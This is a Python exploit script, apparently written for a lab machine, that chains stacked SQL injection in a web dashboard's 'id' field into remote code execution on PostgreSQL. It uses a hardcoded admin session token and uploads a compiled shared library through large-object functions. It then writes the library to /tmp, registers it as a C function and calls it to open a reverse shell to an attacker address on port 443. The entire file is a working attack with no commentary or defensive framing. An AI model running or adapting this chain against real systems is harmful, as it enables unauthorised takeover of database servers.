#!/usr/bin/python3

import requests
import random
import string
from urllib.parse import quote_plus
import math

# Parameters for call to rev_shell
LHOST = "10.10.15.122"
LPORT = 443


# Generate a random string
def randomString(N):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=N))

# Inject a query
def sqli(q):
    
    url = "10.129.204.251"

    payload = {
        "title": "arthur",
        "username": "arthur1",
        "password": "arthur2",
        "id": f"34;{q}"
    }


    cookie_values = {
        "Host":"10.129.204.251:8080",
        "Cookie":"Authentication= eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTcyMTU0OTgwNCwiZXhwIjoxNzIxNTU4NDQ0fQ.I5QaLRiyAT6BaVyb99vB8bfERg9ajqywSzBc8V7Dv-FM4kADDs98xfYoH0QCmYYc8mgWLy75yKfM-GwphmTe7A",
        "Content-Type": "application/x-www-form-urlencoded", 
        "Referer": "http://10.129.204.251:8080/dashboard",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    requests.post(url=f"http://{url}:8080/dashboard/edit",headers=cookie_values, data=payload)
    

# Read the compiled extension
with open("pg_rev_shell.so","rb") as f:
    raw = f.read()

# Create a large object
loid = random.randint(50000,60000)
sqli(f"SELECT lo_from_bytea({loid}, $$$$);")
print(f"[*] Created large object with ID: {loid}")

# Upload pg_rev_shell.so to large object
for pageno in range(math.ceil(len(raw)/2028)):
    page = raw[pageno*2028:pageno*2028+2028]
    offset = (pageno * 2028)
    hex_page = '\\x' + page.hex()
    print(f"[*] Uploading Page: {pageno}, Length: {len(page)}")
    # sqli(f"SELECT  lo_put(loid, pageno, data) VALUES ({loid}, {pageno}, decode('{page.hex()}','hex'));")
    sqli(f"SELECT lo_put({loid}, {offset},$${hex_page}$$);")

# Write large object to file and run reverse shell
query  = f"SELECT lo_export({loid}, $$/tmp/pg_rev_shell.so$$);"
query += f"SELECT lo_unlink({loid});"
query += "DROP FUNCTION IF EXISTS rev_shell;"
query += "CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS $$/tmp/pg_rev_shell$$, $$rev_shell$$ LANGUAGE C STRICT;"
query += f"SELECT rev_shell($${LHOST}$$, {LPORT});"
# print(f"[*] Writing pg_rev_shell.so to disk and triggering reverse shell (LHOST: {LHOST}, LPORT: {LPORT})")

# print(f"this is the query: {query}")
sqli(query)

